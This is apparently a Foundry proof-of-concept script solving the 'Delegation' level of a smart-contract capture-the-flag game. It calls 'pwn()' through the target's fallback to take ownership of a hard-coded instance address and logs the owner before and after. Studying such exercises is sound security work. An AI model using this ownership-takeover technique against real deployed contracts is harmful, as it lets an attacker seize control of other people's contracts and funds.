// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "src/level6/Delegation.sol";

// Objective:
// The goal of this level is for you to claim ownership of the instance you are given.

contract POC is Script {
    Delegation instance =
        Delegation(0x65Bce0Fdf841808546B24A474F5FBF5062D8D55F);

    function run() external {
        vm.startBroadcast();

        console.log("start::owner::", instance.owner());

        (bool status, ) = address(instance).call(
            abi.encodeWithSignature("pwn()")
        );
        
        console.log("status::", status);
        console.log("end::owner::", instance.owner());

        vm.stopBroadcast();
    }
}
